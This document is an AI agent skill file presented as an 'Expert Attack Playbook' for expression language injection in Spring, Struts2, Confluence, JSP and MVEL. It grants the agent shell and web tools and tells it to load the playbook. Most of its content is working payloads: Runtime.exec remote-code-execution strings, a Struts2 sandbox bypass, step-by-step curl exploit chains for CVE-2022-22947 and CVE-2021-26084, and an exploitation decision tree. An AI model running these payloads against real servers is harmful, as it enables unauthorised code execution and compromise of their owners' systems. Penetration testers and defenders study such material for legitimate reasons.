---
name: expression-language-injection
description: Expression Language injection — SpEL (Spring), OGNL (Struts2/Confluence), Java EL, CVE-2022-22947 Spring Cloud Gateway, CVE-2021-26084 Confluence, Struts2 _memberAccess bypass, and EL injection via error messages/bean properties.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Expression Language Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: EL injection achieves full RCE when user-controlled input reaches an expression language evaluator (SpEL, OGNL, Java EL). Critical CVEs include Spring Cloud Gateway (CVE-2022-22947), Confluence (CVE-2021-26084), and Struts2 (multiple). Base models often suggest SpEL payloads without accounting for security manager restrictions or the difference between SpEL, OGNL, and Java EL.

## 0. RELATED ROUTING

- ssti-hunter — if the template engine (Thymeleaf, FreeMarker) evaluates EL expressions
- rce — for general RCE vectors
- deserialization — Java deserialization often co-occurs with EL injection in app servers

---

## 1. EL TYPES QUICK REFERENCE

| EL Type | Framework | Context | Sandboxed? |
|---|---|---|---|
| SpEL | Spring Framework | @Value, SpEL templates, SpEL-based access control | Yes (by policy) |
| OGNL | Apache Struts2, MyBatis | Action parameters, value stack expressions | Yes (SecurityMember via _memberAccess) |
| Java EL (JSP EL) | JSP/Servlet | JSP pages, EL expressions ${...} | Restricted (no method calls by default) |
| MVEL | JBoss/Drools | Rule evaluation | No sandbox |
| JEXL | Apache | Custom expression contexts | Varies |

---

## 2. SPEL INJECTION

### Common Injection Sinks

- `@Value("#{userInput}")` in Spring beans
- `ExpressionParser.parseExpression(userInput)`
- Spring Security SpEL expressions (hasRole, etc.)
- Spring Data JPA `@Query` with SpEL
- Thymeleaf `th:` attributes that evaluate SpEL

### SpEL Probe Payloads

```
# Check if SpEL is evaluating:
#{7*7}          → should return 49
${7*7}          → Java EL syntax
T(java.lang.Runtime)  → SpEL class access
```

### SpEL RCE Payload

```java
// Direct Runtime.exec via T() operator:
T(java.lang.Runtime).getRuntime().exec('id')

// With output capture:
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()

// ProcessBuilder for complex commands:
new java.lang.ProcessBuilder(new String[]{'bash','-c','id'}).start()

// URL-safe variant:
T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})
```

### Spring Security SpEL Bypass

```
# hasRole check bypassed via SpEL math/string tricks:
# Target: hasRole('ADMIN')
# Injection: ' or T(java.lang.Runtime).getRuntime().exec('id') eq '
```

---

## 3. CVE-2022-22947: SPRING CLOUD GATEWAY SPEL RCE

**Affected**: Spring Cloud Gateway < 3.1.1, < 3.0.7
**Severity**: CVSS 10.0
**Vector**: Actuator endpoint allows adding new routes with SpEL filter expressions

### Exploitation

```bash
# Step 1: Add malicious route via /actuator/gateway/routes
curl -X POST http://target:9000/actuator/gateway/routes/evil \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "evil",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()}"
      }
    }],
    "uri": "http://httpbin.org",
    "predicates": [{"name": "Path", "args": {"_genkey_0": "/evil"}}]
  }'

# Step 2: Refresh routes
curl -X POST http://target:9000/actuator/gateway/refresh

# Step 3: Trigger the route and read result header
curl -v http://target:9000/evil
# Result header contains RCE output
```

---

## 4. OGNL INJECTION (APACHE STRUTS2)

### OGNL Context and Security Member

Struts2 wraps all OGNL evaluation with a security context. `_memberAccess` controls accessible class members.

Classic bypass (pre-2017):
```java
// Set _memberAccess to allow all
#_memberAccess["allowStaticMethodAccess"]=true,
@java.lang.Runtime@getRuntime().exec("id")
```

Modern Struts2 (after security hardening):
```java
// Use OgnlContext workaround
#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),
@java.lang.Runtime@getRuntime().exec("id")
```

### OGNL RCE Payload (Struts2)

```
%{(#_memberAccess['allowStaticMethodAccess']=true)(#a=@java.lang.Runtime@getRuntime().exec('id'))(#b=new java.io.InputStreamReader(#a.getInputStream()))(#c=new java.io.BufferedReader(#b))(#d=#c.readLine())(#e=@org.apache.struts2.ServletActionContext@getResponse().getWriter())(#e.println(#d))(#e.flush())(#e.close())}
```

### CVE-2021-26084: Confluence OGNL Injection

**Affected**: Confluence Server and Data Center
**Vector**: WebWork OGNL injection via `querystring` parameter

```bash
# Probe:
curl -X POST "https://confluence.target.com/pages/resumedraft.action?draftId=0" \
  --data-urlencode "querystring=%24%7B7%2A7%7D"
# If 49 appears in response → OGNL evaluating

# RCE:
curl -X POST "https://confluence.target.com/pages/resumedraft.action?draftId=0" \
  --data-urlencode 'querystring=${Runtime.exec("id")}'
```

**CVE-2021-26084 PoC tooling**: `nuclei -t cves/2021/CVE-2021-26084.yaml`

---

## 5. JAVA EL INJECTION (JSP EL)

Standard JSP EL (`${...}`) is restricted by default — no method calls, no class loading. But some applications use EL in unsafe contexts.

### Vulnerable Pattern

```java
// Server-side: render user input as EL expression
String template = "<p>" + userInput + "</p>";
// If evaluated with ExpressionFactory, ${7*7} → 49
```

### Java EL Probe

```
${7*7}
${applicationScope}
${pageContext.request.serverInfo}
```

### Unrestricted EL RCE (when ClassLoader accessible)

```
${"".class.forName("java.lang.Runtime").getMethod("exec","".class.forName("java.lang.String")).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 6. MVEL INJECTION

MVEL (JBoss Rules, Red Hat Decision Manager) has no sandbox:

```java
// Direct class instantiation
Runtime.exec("id")
new java.lang.ProcessBuilder(new String[]{"id"}).start()

// Via reflection
Class.forName("java.lang.Runtime").getMethod("exec", Class.forName("java.lang.String")).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), "id")
```

---

## 7. DETECTION & IDENTIFICATION

### Probe Payloads (Safe)

```
# Mathematical — look for evaluated result vs literal string in response
#{7*7}      → 49? (SpEL)
${7*7}      → 49? (Java EL / JEXL)
%{7*7}      → 49? (OGNL / Struts2)
${7*7}      → 49? (Thymeleaf)
[[7*7]]     → 49? (Thymeleaf inline)

# Property access — look for class name or hash in error:
#{user.class}
${applicationScope.getClass()}
%{#request}
```

### Error-Based Detection

EL errors often leak framework information:
```
Input: ${undefined_var}
Error: "PropertyNotFoundException: undefined_var"  → Java EL
Error: "ExpressionParseException"  → SpEL
Error: "OGNL not found: undefined_var"  → OGNL
```

---

## 8. EXPLOITATION DECISION TREE

```
EL-like behavior detected?
├── Identify EL type:
│   ├── #{...} with Spring → SpEL
│   ├── %{...} with Struts2 → OGNL
│   ├── ${...} in JSP/JSTL → Java EL
│   └── ${...} in JBoss/Drools → MVEL
│
├── SpEL?
│   ├── T(java.lang.Runtime).getRuntime().exec('cmd')
│   ├── New ProcessBuilder(['bash','-c','cmd']).start()
│   └── Check CVE-2022-22947 (Spring Cloud Gateway)
│
├── OGNL?
│   ├── Struts2: #_memberAccess bypass → @Runtime@exec
│   ├── Confluence: CVE-2021-26084 querystring injection
│   └── MyBatis: ${param} vs #{param} (literal injection)
│
├── Java EL?
│   ├── Restricted by default → try ClassLoader access
│   ├── Look for unrestricted ELResolver config
│   └── Probe applicationScope, sessionScope, pageContext
│
└── MVEL?
    └── No sandbox: Runtime.exec('cmd') directly
```

---

## 9. KNOWN CVEs SUMMARY

| CVE | Product | Vector | Severity |
|---|---|---|---|
| CVE-2022-22947 | Spring Cloud Gateway < 3.1.1 | Actuator route SpEL | CVSS 10 |
| CVE-2021-26084 | Confluence Server/DC | WebWork OGNL querystring | CVSS 9.8 |
| CVE-2017-5638 | Apache Struts2 | Content-Type OGNL | CVSS 10 |
| CVE-2016-4461 | Apache Struts2 | ActionMessage OGNL | CVSS 9.8 |
| CVE-2013-2251 | Apache Struts2 | action/redirect OGNL | CVSS 10 |
| CVE-2018-11776 | Apache Struts2 | Namespace OGNL | CVSS 10 |
| CVE-2022-22963 | Spring Cloud Function | routing-expression SpEL | CVSS 9.8 |

---

## 10. TOOL REFERENCES

```bash
# Nuclei templates for EL injection CVEs
nuclei -t cves/ -t fuzzing/expression-language-injection.yaml -u https://target

# Struts2 scanner
strauts2scanner -u https://target/action

# Spring actuator check
curl http://target/actuator/gateway/routes
```
